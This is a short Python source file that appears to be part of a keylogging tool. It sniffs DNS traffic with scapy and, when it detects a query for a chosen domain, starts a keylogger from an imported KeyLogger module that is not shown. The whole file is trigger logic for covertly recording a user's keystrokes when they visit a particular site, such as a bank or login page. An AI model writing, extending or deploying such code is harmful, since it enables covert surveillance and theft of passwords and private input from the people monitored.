import scapy.all as scapy
import threading
from KeyLogger import  KeyLogger


class NetworkTrafficAnalyzer:
    def __init__(self, domain):
        self.domain = domain

    def start_sniffing(self):
        scapy.sniff(filter="udp port 53", prn=self.packet_callback, store=0)

    def packet_callback(self, packet):
        if scapy.DNSQR in packet:
            dns_layer = packet[scapy.DNSQR]
            queried_domain = dns_layer.qname.decode('utf-8')
            if self.domain in queried_domain:
                print(f"DNS query for {self.domain} detected. Starting keylogger...")
                keylogger_thread = threading.Thread(target=self.start_keylogger)
                keylogger_thread.start()

    def start_keylogger(self):
        keylogger = KeyLogger()
        keylogger.start_logging()


